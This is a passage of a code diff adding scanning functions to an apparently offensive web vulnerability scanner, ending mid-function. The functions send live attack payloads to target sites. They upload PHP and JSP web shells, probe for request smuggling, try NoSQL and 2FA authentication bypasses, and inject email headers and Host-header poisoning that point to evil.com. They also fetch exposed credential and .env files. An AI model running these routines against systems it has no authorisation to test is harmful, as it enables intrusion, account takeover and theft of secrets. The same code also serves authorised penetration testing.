+            if any(x in param.lower() for x in ["price", "amount", "qty", "quantity", "total", "cost", "discount"]):
+                try:
+                    # Test negative values
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[param] = ["-1"]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=5)
+                    if r.status_code == 200 and "error" not in r.text.lower():
+                        findings.append({"type": f"Business Logic: Negative {param}", "severity": "high",
+                                         "url": test_url, "detail": f"Negative value accepted for {param}",
+                                         "template": "apex-logic"})
+                    # Test zero
+                    qs[param] = ["0"]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=5)
+                    if r.status_code == 200 and "error" not in r.text.lower():
+                        findings.append({"type": f"Business Logic: Zero {param}", "severity": "medium",
+                                         "url": test_url, "detail": f"Zero value accepted for {param}",
+                                         "template": "apex-logic"})
+                except: pass
+    return findings
+
+
+def scan_cache_poisoning(crawl_data):
+    """Test for web cache poisoning."""
+    findings = []
+    tested = set()
+    poison_headers = [
+        ("X-Forwarded-Host", "evil.com"),
+        ("X-Forwarded-Scheme", "nothttps"),
+        ("X-Original-URL", "/evil"),
+        ("X-Rewrite-URL", "/evil"),
+        ("X-Forwarded-Port", "1337"),
+    ]
+    for page in crawl_data.get("pages", [])[:5]:
+        url = page["url"]
+        base = "/".join(url.split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            baseline = _S.get(url, timeout=5)
+            for header, value in poison_headers:
+                r = _S.get(url, timeout=5, headers={header: value})
+                if value in r.text and value not in baseline.text:
+                    findings.append({"type": f"Cache Poisoning via {header}", "severity": "high",
+                                     "url": url, "detail": f"{header}: {value} reflected in response",
+                                     "template": "apex-cache"})
+        except: pass
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Smart context-aware scanning — adapts to what it finds
+# ---------------------------------------------------------------------------
+
+def scan_smart(crawl_data, technologies, web_targets):
+    """Adapt scan based on detected tech stack."""
+    findings = []
+    pages = crawl_data.get("pages", [])
+    if not pages: return findings
+    base = "/".join(pages[0]["url"].split("/", 3)[:3])
+    tech = " ".join(technologies).lower()
+
+    # WordPress-specific
+    if "wordpress" in tech or "wp-" in str(pages):
+        wp_paths = ["/wp-json/wp/v2/users", "/wp-json/wp/v2/posts?per_page=100",
+                    "/wp-config.php.bak", "/wp-content/debug.log", "/?author=1"]
+        for path in wp_paths:
+            try:
+                r = _S.get(f"{base}{path}", timeout=5)
+                if r.status_code == 200 and len(r.content) > 50:
+                    if "email" in r.text or "slug" in r.text:
+                        findings.append({"type": "WordPress User Enumeration", "severity": "medium",
+                                         "url": f"{base}{path}", "detail": "User data exposed via REST API",
+                                         "template": "apex-wp"})
+                    elif "DB_PASSWORD" in r.text or "DB_HOST" in r.text:
+                        findings.append({"type": "WordPress Config Exposed", "severity": "critical",
+                                         "url": f"{base}{path}", "detail": "wp-config.php backup accessible",
+                                         "template": "apex-wp"})
+            except: pass
+
+    # Spring Boot / Java
+    if any(x in tech for x in ["spring", "java", "tomcat", "actuator"]):
+        spring_paths = ["/actuator", "/actuator/env", "/actuator/heapdump",
+                        "/actuator/mappings", "/actuator/beans", "/actuator/httptrace",
+                        "/env", "/health", "/metrics", "/dump", "/trace"]
+        for path in spring_paths:
+            try:
+                r = _S.get(f"{base}{path}", timeout=5)
+                if r.status_code == 200:
+                    body = r.text.lower()
+                    if any(x in body for x in ["password", "secret", "key", "token", "datasource"]):
+                        findings.append({"type": f"Spring Boot Actuator: {path}", "severity": "critical",
+                                         "url": f"{base}{path}", "detail": "Sensitive data in actuator endpoint",
+                                         "template": "apex-spring"})
+                    elif "heapdump" in path:
+                        findings.append({"type": "Spring Boot Heap Dump", "severity": "critical",
+                                         "url": f"{base}{path}", "detail": "Memory dump accessible — contains secrets",
+                                         "template": "apex-spring"})
+            except: pass
+
+    # Django / Python
+    if any(x in tech for x in ["django", "python", "flask"]):
+        for path in ["/admin/", "/__debug__/", "/api/schema/", "/api/docs/"]:
+            try:
+                r = _S.get(f"{base}{path}", timeout=5)
+                if r.status_code == 200 and ("django" in r.text.lower() or "debug" in r.text.lower()):
+                    findings.append({"type": f"Django Debug/Admin: {path}", "severity": "high",
+                                     "url": f"{base}{path}", "detail": "Django admin or debug accessible",
+                                     "template": "apex-django"})
+            except: pass
+
+    # Laravel / PHP
+    if any(x in tech for x in ["laravel", "php", "symfony"]):
+        for path in ["/.env", "/storage/logs/laravel.log", "/phpinfo.php",
+                     "/telescope", "/horizon", "/api/documentation"]:
+            try:
+                r = _S.get(f"{base}{path}", timeout=5)
+                if r.status_code == 200 and len(r.content) > 100:
+                    if "APP_KEY" in r.text or "DB_PASSWORD" in r.text:
+                        findings.append({"type": "Laravel .env Exposed", "severity": "critical",
+                                         "url": f"{base}{path}", "detail": "Laravel .env with secrets accessible",
+                                         "template": "apex-laravel"})
+                    elif "laravel.log" in path and len(r.content) > 1000:
+                        findings.append({"type": "Laravel Log Exposed", "severity": "high",
+                                         "url": f"{base}{path}", "detail": f"Log file ({len(r.content)}b) accessible",
+                                         "template": "apex-laravel"})
+            except: pass
+
+    # Node.js / Express
+    if any(x in tech for x in ["node", "express", "next.js", "nuxt"]):
+        for path in ["/.env", "/api/health", "/api/status", "/_next/static/chunks/",
+                     "/node_modules/.bin/", "/package.json", "/.git/config"]:
+            try:
+                r = _S.get(f"{base}{path}", timeout=5)
+                if r.status_code == 200:
+                    if "dependencies" in r.text or "scripts" in r.text:
+                        findings.append({"type": "package.json Exposed", "severity": "medium",
+                                         "url": f"{base}{path}", "detail": "Node.js package.json accessible",
+                                         "template": "apex-node"})
+            except: pass
+
+    # AWS / Cloud
+    for path in ["/aws.json", "/credentials", "/.aws/credentials", "/s3.json",
+                 "/cloud-config.json", "/gcp-credentials.json"]:
+        try:
+            r = _S.get(f"{base}{path}", timeout=5)
+            if r.status_code == 200 and any(x in r.text for x in ["AKIA", "aws_access", "private_key"]):
+                findings.append({"type": "Cloud Credentials Exposed", "severity": "critical",
+                                 "url": f"{base}{path}", "detail": "Cloud credentials file accessible",
+                                 "template": "apex-cloud"})
+        except: pass
+
+    # API versioning — test old versions
+    for target in web_targets[:3]:
+        for old_ver in ["/api/v0/", "/api/v1/", "/api/v2/", "/api/beta/", "/api/legacy/"]:
+            try:
+                r = _S.get(f"{target}{old_ver}users", timeout=5)
+                if r.status_code == 200:
+                    try:
+                        data = r.json()
+                        if isinstance(data, list) and len(data) > 0:
+                            findings.append({"type": f"Old API Version: {old_ver}users", "severity": "high",
+                                             "url": f"{target}{old_ver}users",
+                                             "detail": f"Old API returns {len(data)} users without auth",
+                                             "template": "apex-api-ver"})
+                    except: pass
+            except: pass
+
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# S3 bucket enum, HTTP smuggling detection, email injection, DNS rebinding
+# ---------------------------------------------------------------------------
+
+def scan_s3_buckets(target, subdomains):
+    """Find misconfigured S3 buckets related to the target."""
+    findings = []
+    import re as _re
+    domain = target.replace("www.", "").split(".")[0]
+    bucket_names = [
+        domain, f"{domain}-backup", f"{domain}-dev", f"{domain}-staging",
+        f"{domain}-prod", f"{domain}-assets", f"{domain}-static", f"{domain}-media",
+        f"{domain}-uploads", f"{domain}-files", f"{domain}-data", f"{domain}-logs",
+        f"{domain}-test", f"{domain}-internal", f"{domain}-public", f"{domain}-private",
+    ]
+    for sub in subdomains[:20]:
+        parts = sub.split(".")
+        if len(parts) > 2:
+            bucket_names.append(parts[0])
+
+    for bucket in bucket_names:
+        for region in ["", ".s3.amazonaws.com", ".s3-us-east-1.amazonaws.com",
+                       ".s3-eu-west-1.amazonaws.com", ".s3-ap-southeast-1.amazonaws.com"]:
+            url = f"https://{bucket}{region}" if region else f"https://{bucket}.s3.amazonaws.com"
+            try:
+                r = requests.get(url, timeout=5, verify=False)
+                if r.status_code == 200 and "<ListBucketResult" in r.text:
+                    # Count files
+                    files = len(_re.findall(r"<Key>", r.text))
+                    findings.append({"type": "Public S3 Bucket", "severity": "critical",
+                                     "url": url, "detail": f"Bucket {bucket} is public — {files} files listed",
+                                     "template": "apex-s3"})
+                    break
+                elif r.status_code == 403:
+                    findings.append({"type": "S3 Bucket Exists (Private)", "severity": "low",
+                                     "url": url, "detail": f"Bucket {bucket} exists but is private",
+                                     "template": "apex-s3"})
+                    break
+            except: continue
+    return findings
+
+
+def scan_request_smuggling(web_targets):
+    """Detect HTTP request smuggling vulnerabilities."""
+    findings = []
+    for target in web_targets[:5]:
+        try:
+            # CL.TE probe
+            import socket, ssl
+            parsed = urllib.parse.urlparse(target)
+            host = parsed.netloc
+            port = 443 if parsed.scheme == "https" else 80
+            path = parsed.path or "/"
+
+            payload = (
+                f"POST {path} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 6\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"\r\n"
+                f"0\r\n"
+                f"\r\n"
+                f"G"
+            ).encode()
+
+            sock = socket.create_connection((host.split(":")[0], port), timeout=5)
+            if port == 443:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host.split(":")[0])
+            sock.send(payload)
+            resp = sock.recv(4096).decode("utf-8", errors="ignore")
+            sock.close()
+
+            if "400" in resp[:50] and "Bad Request" in resp:
+                pass  # Normal
+            elif "200" in resp[:50] or "timeout" in resp.lower():
+                findings.append({"type": "Possible HTTP Request Smuggling (CL.TE)", "severity": "critical",
+                                 "url": target, "detail": "Server may be vulnerable to request smuggling",
+                                 "template": "apex-smuggling"})
+        except: pass
+    return findings
+
+
+def scan_email_injection(crawl_data):
+    """Test contact/email forms for header injection."""
+    findings = []
+    inject_payloads = [
+        "test@test.com\nBcc: attacker@evil.com",
+        "test@test.com\r\nBcc: attacker@evil.com",
+        "test@test.com%0ABcc:attacker@evil.com",
+        "test@test.com%0D%0ABcc:attacker@evil.com",
+    ]
+    for form in crawl_data.get("forms", []):
+        if form.get("method", "").upper() != "POST": continue
+        inputs = form.get("inputs", [])
+        email_inputs = [i for i in inputs if "email" in i.get("name", "").lower() or
+                       i.get("type", "") == "email"]
+        if not email_inputs: continue
+        action = form.get("action", "")
+        if not action: continue
+        for payload in inject_payloads[:2]:
+            try:
+                data = {i.get("name", "field"): i.get("value", "test") for i in inputs}
+                for ei in email_inputs:
+                    data[ei["name"]] = payload
+                r = _S.post(action, data=data, timeout=5)
+                if r.status_code in (200, 302) and "error" not in r.text.lower():
+                    findings.append({"type": "Email Header Injection", "severity": "medium",
+                                     "url": action, "detail": f"Email form may be injectable",
+                                     "template": "apex-email"})
+                    break
+            except: continue
+    return findings
+
+
+def scan_open_ports_web(subdomains):
+    """Find web services on non-standard ports — often less secured."""
+    findings = []
+    ports = [8080, 8443, 8000, 8888, 9090, 3000, 4000, 5000, 7443, 9443, 8081, 8082, 4443, 10000]
+    for sub in subdomains[:10]:
+        for port in ports:
+            try:
+                proto = "https" if port in (8443, 7443, 9443, 4443) else "http"
+                r = requests.get(f"{proto}://{sub}:{port}", timeout=3, verify=False)
+                if r.status_code < 400:
+                    title = ""
+                    try:
+                        from bs4 import BeautifulSoup as BS
+                        title = BS(r.text, "lxml").title.string[:50] if BS(r.text, "lxml").title else ""
+                    except: pass
+                    findings.append({"type": f"Web Service on Port {port}", "severity": "medium",
+                                     "url": f"{proto}://{sub}:{port}",
+                                     "detail": f"Service running: {title or r.status_code}",
+                                     "template": "apex-ports"})
+            except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# DNS zone transfer, cert transparency, API fuzzing, 2FA bypass
+# ---------------------------------------------------------------------------
+
+def scan_dns_zone_transfer(target):
+    """Attempt DNS zone transfer — reveals all subdomains at once."""
+    findings = []
+    try:
+        import subprocess
+        # Get nameservers
+        ns_result = subprocess.run(["dig", "+short", "NS", target], capture_output=True, text=True, timeout=10)
+        nameservers = [ns.rstrip(".") for ns in ns_result.stdout.splitlines() if ns.strip()]
+        for ns in nameservers[:3]:
+            result = subprocess.run(["dig", "AXFR", target, f"@{ns}"], capture_output=True, text=True, timeout=10)
+            if "Transfer failed" not in result.stdout and len(result.stdout) > 200:
+                lines = [l for l in result.stdout.splitlines() if l and not l.startswith(";")]
+                if len(lines) > 5:
+                    findings.append({"type": "DNS Zone Transfer Allowed", "severity": "critical",
+                                     "url": f"dns://{target}", "detail": f"NS {ns} allows AXFR — {len(lines)} records exposed",
+                                     "template": "apex-dns"})
+    except: pass
+    return findings
+
+
+def get_cert_transparency_subdomains(target):
+    """Get subdomains from certificate transparency logs — finds hidden subdomains."""
+    subdomains = set()
+    try:
+        r = requests.get(f"https://crt.sh/?q=%.{target}&output=json", timeout=15)
+        for entry in r.json():
+            name = entry.get("name_value", "")
+            for sub in name.split("\n"):
+                sub = sub.strip().lstrip("*.")
+                if sub.endswith(f".{target}") or sub == target:
+                    subdomains.add(sub)
+    except: pass
+    try:
+        r = requests.get(f"https://api.certspotter.com/v1/issuances?domain={target}&include_subdomains=true&expand=dns_names", timeout=15)
+        for cert in r.json():
+            for name in cert.get("dns_names", []):
+                name = name.lstrip("*.")
+                if name.endswith(f".{target}"):
+                    subdomains.add(name)
+    except: pass
+    return list(subdomains)
+
+
+def scan_api_fuzzing(web_targets):
+    """Fuzz API endpoints with common wordlist."""
+    findings = []
+    api_words = [
+        "users", "user", "admin", "accounts", "account", "profile", "profiles",
+        "config", "configuration", "settings", "debug", "test", "internal",
+        "private", "secret", "token", "tokens", "keys", "key", "auth", "login",
+        "logout", "register", "signup", "password", "reset", "forgot",
+        "export", "import", "backup", "dump", "logs", "log", "metrics",
+        "health", "status", "info", "version", "env", "environment",
+        "graphql", "swagger", "api-docs", "openapi", "schema",
+        "upload", "uploads", "files", "file", "download", "media",
+        "payment", "payments", "billing", "invoice", "order", "orders",
+        "webhook", "webhooks", "callback", "notify", "notification",
+        "search", "query", "report", "reports", "analytics", "stats",
+        "employee", "employees", "staff", "customer", "customers",
+        "v1", "v2", "v3", "beta", "alpha", "legacy", "old", "new",
+    ]
+    for target in web_targets[:3]:
+        for prefix in ["/api/", "/api/v1/", "/api/v2/", "/"]:
+            for word in api_words:
+                url = f"{target}{prefix}{word}"
+                try:
+                    r = _S.get(url, timeout=3, allow_redirects=False)
+                    if r.status_code == 200:
+                        ctype = r.headers.get("content-type", "").lower()
+                        if "json" in ctype:
+                            try:
+                                data = r.json()
+                                if isinstance(data, (list, dict)) and len(str(data)) > 30:
+                                    has_sensitive = any(k in str(data).lower() for k in
+                                                      ["email", "password", "token", "secret", "ssn", "credit", "phone"])
+                                    sev = "critical" if has_sensitive else "medium"
+                                    findings.append({"type": f"Unprotected API: {prefix}{word}", "severity": sev,
+                                                     "url": url, "detail": f"Returns JSON ({len(str(data))}b)",
+                                                     "template": "apex-apifuzz"})
+                            except: pass
+                except: continue
+    return findings
+
+
+def scan_2fa_bypass(crawl_data):
+    """Test for 2FA/OTP bypass techniques."""
+    findings = []
+    for page in crawl_data.get("pages", [])[:5]:
+        url = page["url"]
+        if any(x in url.lower() for x in ["2fa", "otp", "verify", "mfa", "totp", "code"]):
+            base = "/".join(url.split("/", 3)[:3])
+            # Test null/empty OTP
+            for payload in [{"code": ""}, {"code": "000000"}, {"code": "null"}, {"otp": ""}, {"token": ""}]:
+                try:
+                    r = _S.post(url, json=payload, timeout=5)
+                    if r.status_code == 200 and "invalid" not in r.text.lower() and "error" not in r.text.lower():
+                        findings.append({"type": "Possible 2FA Bypass", "severity": "critical",
+                                         "url": url, "detail": f"Empty/null OTP accepted: {payload}",
+                                         "template": "apex-2fa"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_insecure_deserialization(crawl_data):
+    """Detect potential deserialization endpoints."""
+    findings = []
+    deser_signatures = [
+        b"\xac\xed\x00\x05",  # Java serialized object
+        b"O:4:",               # PHP serialized object
+        b"rO0AB",              # Java base64 serialized
+    ]
+    for page in crawl_data.get("pages", []):
+        try:
+            r = _S.get(page["url"], timeout=5)
+            # Check cookies for serialized data
+            for name, val in r.cookies.items():
+                import base64
+                try:
+                    decoded = base64.b64decode(val + "==")
+                    for sig in deser_signatures:
+                        if decoded.startswith(sig):
+                            findings.append({"type": "Serialized Object in Cookie", "severity": "high",
+                                             "url": page["url"], "detail": f"Cookie {name} contains serialized data",
+                                             "template": "apex-deser"})
+                except: pass
+            # Check response body
+            for sig in deser_signatures:
+                if sig in r.content:
+                    findings.append({"type": "Serialized Object in Response", "severity": "high",
+                                     "url": page["url"], "detail": "Response contains serialized object",
+                                     "template": "apex-deser"})
+        except: pass
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Missing vulnerability scanners — completing the full list
+# ---------------------------------------------------------------------------
+
+def scan_nosql_injection(crawl_data):
+    """Test for NoSQL injection (MongoDB, etc.)."""
+    findings = []
+    payloads = [
+        {"$gt": ""},
+        {"$ne": "invalid"},
+        {"$where": "1==1"},
+        {"$regex": ".*"},
+    ]
+    for form in crawl_data.get("forms", []):
+        if form.get("method", "").upper() != "POST": continue
+        action = form.get("action", "")
+        if not action: continue
+        for payload in payloads:
+            try:
+                data = {i.get("name","f"): payload for i in form.get("inputs",[]) if i.get("type") not in ("submit","hidden")}
+                r = _S.post(action, json=data, timeout=5, headers={"Content-Type":"application/json"})
+                if r.status_code == 200 and any(x in r.text.lower() for x in ["welcome","dashboard","logged","token","success"]):
+                    findings.append({"type":"NoSQL Injection","severity":"critical","url":action,
+                                     "detail":f"NoSQL operator {list(payload.keys())[0]} bypassed auth","template":"apex-nosql"})
+                    break
+            except: continue
+    for url, params in crawl_data.get("params",{}).items():
+        for p in params:
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = ["[$ne]=invalid"]
+                test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
+                r = _S.get(test_url, timeout=5)
+                if r.status_code == 200 and len(r.content) > 100:
+                    findings.append({"type":"NoSQL Injection (GET)","severity":"high","url":test_url,
+                                     "detail":f"NoSQL operator in param {p}","template":"apex-nosql"})
+            except: continue
+    return findings
+
+
+def scan_mass_assignment(crawl_data):
+    """Test for mass assignment / auto-binding vulnerabilities."""
+    findings = []
+    extra_fields = ["role","admin","is_admin","isAdmin","superuser","privilege","level",
+                    "verified","active","status","permissions","group","type","plan"]
+    for form in crawl_data.get("forms",[]):
+        if form.get("method","").upper() != "POST": continue
+        action = form.get("action","")
+        if not action: continue
+        try:
+            data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[]) if i.get("name")}
+            baseline = _S.post(action, data=data, timeout=5)
+            for field in extra_fields:
+                data[field] = "true"
+                r = _S.post(action, data=data, timeout=5)
+                if r.status_code == 200 and r.text != baseline.text:
+                    findings.append({"type":f"Mass Assignment: {field}","severity":"high","url":action,
+                                     "detail":f"Extra field {field}=true changes response","template":"apex-mass"})
+                    break
+                del data[field]
+        except: continue
+    return findings
+
+
+def scan_file_upload(crawl_data):
+    """Test file upload endpoints for unrestricted upload."""
+    findings = []
+    webshell_php = b"<?php echo shell_exec($_GET['cmd']); ?>"
+    webshell_jsp = b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+    for form in crawl_data.get("forms",[]):
+        inputs = form.get("inputs",[])
+        file_inputs = [i for i in inputs if i.get("type") == "file"]
+        if not file_inputs: continue
+        action = form.get("action","")
+        if not action: continue
+        for fname, content, ctype in [
+            ("shell.php", webshell_php, "application/x-php"),
+            ("shell.php.jpg", webshell_php, "image/jpeg"),
+            ("shell.phtml", webshell_php, "text/html"),
+            ("shell.php%00.jpg", webshell_php, "image/jpeg"),
+        ]:
+            try:
+                files = {file_inputs[0].get("name","file"): (fname, content, ctype)}
+                r = _S.post(action, files=files, timeout=5)
+                if r.status_code in (200,201):
+                    # Check if file was uploaded and accessible
+                    urls_in_resp = re.findall(r'https?://[^\s\'"<>]+' + fname.split(".")[0], r.text)
+                    if urls_in_resp or fname.split(".")[0] in r.text:
+                        findings.append({"type":"Unrestricted File Upload","severity":"critical","url":action,
+                                         "detail":f"Uploaded {fname} accepted","template":"apex-upload"})
+                        break
+            except: continue
+    return findings
+
+
+def scan_csrf(crawl_data):
+    """Check for missing CSRF protection on state-changing forms."""
+    findings = []
+    for form in crawl_data.get("forms",[]):
+        if form.get("method","").upper() != "POST": continue
+        inputs = form.get("inputs",[])
+        has_csrf = any(i.get("name","").lower() in ("csrf","_token","csrftoken","csrf_token",
+                       "authenticity_token","__requestverificationtoken","_csrf") for i in inputs)
+        action = form.get("action","")
+        if not has_csrf and action:
+            findings.append({"type":"Missing CSRF Token","severity":"medium","url":action,
+                             "detail":"POST form has no CSRF token","template":"apex-csrf"})
+    return findings
+
+
+def scan_clickjacking(crawl_data):
+    """Check for clickjacking vulnerability (missing X-Frame-Options / CSP frame-ancestors)."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:5]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            r = _S.get(page["url"], timeout=5)
+            xfo = r.headers.get("X-Frame-Options","")
+            csp = r.headers.get("Content-Security-Policy","")
+            if not xfo and "frame-ancestors" not in csp:
+                findings.append({"type":"Clickjacking (Missing X-Frame-Options)","severity":"medium",
+                                 "url":page["url"],"detail":"No X-Frame-Options or CSP frame-ancestors",
+                                 "template":"apex-clickjack"})
+        except: pass
+    return findings
+
+
+def scan_cookie_security(crawl_data):
+    """Check for insecure cookie flags."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:5]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            r = _S.get(page["url"], timeout=5)
+            for name, cookie in r.cookies.items():
+                issues = []
+                raw = r.headers.get("Set-Cookie","")
+                if name.lower() in ("session","sessionid","auth","token","jwt","sid","phpsessid","jsessionid"):
+                    if "httponly" not in raw.lower(): issues.append("Missing HttpOnly")
+                    if "secure" not in raw.lower() and page["url"].startswith("https"): issues.append("Missing Secure")
+                    if "samesite" not in raw.lower(): issues.append("Missing SameSite")
+                    if issues:
+                        findings.append({"type":f"Insecure Cookie: {name}","severity":"medium",
+                                         "url":page["url"],"detail":", ".join(issues),"template":"apex-cookie"})
+        except: pass
+    return findings
+
+
+def scan_account_enumeration(crawl_data):
+    """Test for account/user enumeration via login/reset forms."""
+    findings = []
+    for page in crawl_data.get("pages",[]):
+        url = page["url"]
+        if not any(x in url.lower() for x in ["login","signin","forgot","reset","register"]): continue
+        base = "/".join(url.split("/",3)[:3])
+        for path in ["/login","/api/login","/forgot-password","/api/forgot-password","/reset"]:
+            try:
+                r_exist = _S.post(f"{base}{path}", json={"email":"admin@admin.com","password":"wrong"}, timeout=5)
+                r_noexist = _S.post(f"{base}{path}", json={"email":"nonexistent_xyz_12345@test.com","password":"wrong"}, timeout=5)
+                if r_exist.status_code == r_noexist.status_code:
+                    if abs(len(r_exist.text) - len(r_noexist.text)) > 20:
+                        findings.append({"type":"User Enumeration","severity":"medium","url":f"{base}{path}",
+                                         "detail":"Different response length for valid vs invalid user",
+                                         "template":"apex-enum"})
+                elif r_exist.status_code != r_noexist.status_code:
+                    findings.append({"type":"User Enumeration (Status Code)","severity":"medium","url":f"{base}{path}",
+                                     "detail":f"Valid user: {r_exist.status_code}, Invalid: {r_noexist.status_code}",
+                                     "template":"apex-enum"})
+            except: continue
+    return findings
+
+
+def scan_password_reset_poisoning(crawl_data):
+    """Test for password reset link poisoning via Host header."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[]):
+        if not any(x in page["url"].lower() for x in ["forgot","reset","password"]): continue
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/forgot-password","/api/forgot-password","/password/reset","/auth/forgot"]:
+            try:
+                r = _S.post(f"{base}{path}",
+                           json={"email":"test@test.com"},
+                           headers={"Host":"evil.com","X-Forwarded-Host":"evil.com"},
+                           timeout=5)
+                if r.status_code in (200,202):
+                    findings.append({"type":"Password Reset Poisoning","severity":"high","url":f"{base}{path}",
+                                     "detail":"Reset endpoint accepts poisoned Host header",
+                                     "template":"apex-pwreset"})
+            except: continue
+    return findings
+
+
+def scan_http_verb_tampering(web_targets):
+    """Test for HTTP verb tampering — bypass auth with unusual methods."""
+    findings = []
+    for target in web_targets[:3]:
+        for path in ["/admin","/api/admin","/internal","/api/users"]:
+            url = f"{target}{path}"
+            try:
+                get_r = _S.get(url, timeout=5)
+                if get_r.status_code == 403:
+                    for method in ["HEAD","OPTIONS","TRACE","PUT","PATCH","DELETE","CONNECT","ARBITRARY"]:
+                        try:
+                            r = _S.request(method, url, timeout=5)
+                            if r.status_code == 200:
+                                findings.append({"type":f"HTTP Verb Tampering: {method}","severity":"high",
+                                                 "url":url,"detail":f"{method} bypasses 403 on {path}",
+                                                 "template":"apex-verb"})
+                                break
+                        except: continue
+            except: continue
+    return findings
+
+
+def scan_log_injection(crawl_data):
+    """Test for log injection via user-controlled input."""
+    findings = []
+    payload = "test\n[CRITICAL] Admin login from 1.2.3.4 - password: admin123"
+    for url, params in crawl_data.get("params",{}).items():
+        for p in params:
+            if any(x in p.lower() for x in ["user","name","email","log","msg","message","comment","note"]):
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=5)
+                    if r.status_code == 200:
+                        findings.append({"type":"Log Injection","severity":"medium","url":test_url,
+                                         "detail":f"Newline in param {p} may inject log entries",
+                                         "template":"apex-log"})
+                        break
+                except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Advanced: XS-Leaks, ReDoS, Source Maps, postMessage, WebRTC, SSRF chains
+# ---------------------------------------------------------------------------
+
+def scan_source_map_exposure(web_targets):
+    """Find exposed JavaScript source maps — reveals original source code."""
+    findings = []
+    for target in web_targets[:5]:
+        try:
+            r = _S.get(target, timeout=5)
+            soup = BeautifulSoup(r.text, "lxml")
+            for script in soup.find_all("script", src=True):
+                src = script["src"]
+                if not src.startswith("http"):
+                    base = "/".join(target.split("/", 3)[:3])
+                    src = base + src if src.startswith("/") else base + "/" + src
+                map_url = src + ".map"
+                try:
+                    rm = _S.get(map_url, timeout=5)
+                    if rm.status_code == 200 and "sources" in rm.text and "mappings" in rm.text:
+                        findings.append({"type": "Source Map Exposed", "severity": "medium",
+                                         "url": map_url, "detail": "JS source map reveals original source code",
+                                         "template": "apex-sourcemap"})
+                except: pass
+        except: pass
+    return findings
+
+
+def scan_redos(crawl_data):
+    """Test for ReDoS (Regular Expression Denial of Service)."""
+    findings = []
+    # Payloads that trigger catastrophic backtracking
+    redos_payloads = [
+        "a" * 50 + "!",
+        "(" * 20 + "a" * 20 + ")" * 20,
+        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
+        "1" * 100 + "@" + "1" * 100 + ".com",
+    ]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if any(x in p.lower() for x in ["email", "phone", "zip", "postal", "regex", "pattern", "search", "query"]):
+                for payload in redos_payloads[:2]:
+                    try:
+                        parsed = urllib.parse.urlparse(url)
+                        qs = urllib.parse.parse_qs(parsed.query)
+                        qs[p] = [payload]
+                        test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                        start = time.time()
+                        r = _S.get(test_url, timeout=10)
+                        elapsed = time.time() - start
+                        if elapsed > 3:
+                            findings.append({"type": "ReDoS (Regex DoS)", "severity": "medium",
+                                             "url": test_url, "detail": f"Response took {elapsed:.1f}s with ReDoS payload in {p}",
+                                             "template": "apex-redos"})
+                            break
+                    except: continue
+    return findings
+
+
+def scan_hsts(crawl_data):
+    """Check for HSTS misconfiguration."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested or not base.startswith("https"): continue
+        tested.add(base)
+        try:
+            r = _S.get(page["url"], timeout=5)
+            hsts = r.headers.get("Strict-Transport-Security", "")
+            if not hsts:
+                findings.append({"type": "Missing HSTS", "severity": "medium", "url": page["url"],
+                                 "detail": "No Strict-Transport-Security header on HTTPS site",
+                                 "template": "apex-hsts"})
+            elif "max-age=0" in hsts:
+                findings.append({"type": "HSTS Disabled (max-age=0)", "severity": "medium",
+                                 "url": page["url"], "detail": "HSTS explicitly disabled", "template": "apex-hsts"})
+            elif "includeSubDomains" not in hsts:
+                findings.append({"type": "HSTS Missing includeSubDomains", "severity": "low",
+                                 "url": page["url"], "detail": "HSTS doesn't cover subdomains", "template": "apex-hsts"})
+        except: pass
+    return findings
+
+
+def scan_dangling_markup(crawl_data):
+    """Test for dangling markup injection — exfiltrate data via HTML injection."""
+    findings = []
+    payload = '<img src="https://evil.com/?data='
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = [payload]
+                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                r = _S.get(test_url, timeout=5)
+                if payload.split('"')[0] in r.text and "<script" not in r.text.lower():
+                    findings.append({"type": "Dangling Markup Injection", "severity": "medium",
+                                     "url": test_url, "detail": f"HTML injected without script execution via {p}",
+                                     "template": "apex-dangling"})
+                    break
+            except: continue
+    return findings
+
+
+def scan_css_injection(crawl_data):
